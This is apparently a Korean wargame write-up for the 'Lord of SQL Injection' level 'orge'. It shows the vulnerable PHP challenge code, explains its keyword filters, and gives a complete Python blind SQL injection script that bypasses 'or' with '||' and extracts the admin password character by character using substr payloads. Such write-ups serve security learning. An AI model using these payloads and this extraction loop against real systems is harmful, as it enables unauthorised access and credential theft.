Lord of SQL Injection No.7 - orge
=============
```
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");
  highlight_file(__FILE__);
?>
```
위 문제에서 알 수 있는 것
-------------
preg_match로 인해 . ()가 $_GET[pw]에 들어 있으면 No Hack ~_~이 뜨면서 문제풀이에 실패하게 된다.
preg_match로 인해 or and가 대소문자 구분없이 $_GET[pw]에 들어가 있으면 HeHe라고 뜨며 문제풀이에 실패하게 된다._
DB에 저장된 id 값이 admin이 되면 Hello admin이 뜬다.
DB에 저장된 비번과 입력한 비번이 같으면 문제가 풀리게 된다.

문제 풀이 법
-------------
1)블라인드 인젝션
이 문제는 다음과 같은 파이썬 코드를 이용하여 푼다.
```
import urllib.request # urllib에서 request모듈을 불러온다.
from urllib.parse import quote # urllib.parse에 있는 quote모듈을 불러온다.
for i in range(1,100): #pw길이를 알아내는 코드
    url="http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
    data= "1 '|| length(pw) = {}-- -".format(i) #파이썬의 format은 문장에 {}있는 곳에 들어갈 수를 지정해주는 역할 or 대신 ||을 써주어 같은 sql문을 만들어준다.
    print(data)
    data=quote(data)
    re = urllib.request.Request(url + data)

    re.add_header( # 이 부분이 없으면 에러발생(권한오류..?)
            "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
    re.add_header( # 이 부분이 사라지게되면 계속해서 이 파일이 있는 장소로 돌아오게되어서 무한루프가 된다.
            "Cookie", "PHPSESSID=9vlqon375eef8ptltfs9152ap6"
        )
    res = urllib.request.urlopen(re)
    print(i)
    if str(res.read()).find("Hello admin") != -1:
        break
print("비밀번호 자릿수는",i,"입니다")
#pw 값을 알아내기 위한 코드
pwlen=i #i의 값이 pw의 길이임으로 다음 코드에서 활용하기 위해 pwlen에 pw길이를 저장한다.
key = "" # 알아낸 비밀번호를 저장하기 위한 변수
for i in range(1, pwlen+1): #range는 두번째 입력한 숫자의 -1까지 돌리므로 비밀번호 길이에 +1을 해준다.
    for j in range(32, 127):
        url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
        data = "1'|| substr(pw, 1, {}) = '{}'-- -".format(str(i), key + chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=9vlqon375eef8ptltfs9152ap6"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1: #잘라낸 길이 만큼이 저장된 비밀번호와 같으면 Hello admin이뜨는것을 활용하여 Hello admin이 뜨지않으면 -1을 반환해서 다시 j부분을 계속돌리고 뜨면 for문의 j를 멈추어 다음 자리를 찾는 것을 할 수 있게 한다.
            key += chr(j).lower()
            print(key)
            break
print("비밀번호는",key)
```
정답으로 6c864dec라는 값을 얻게 된다.
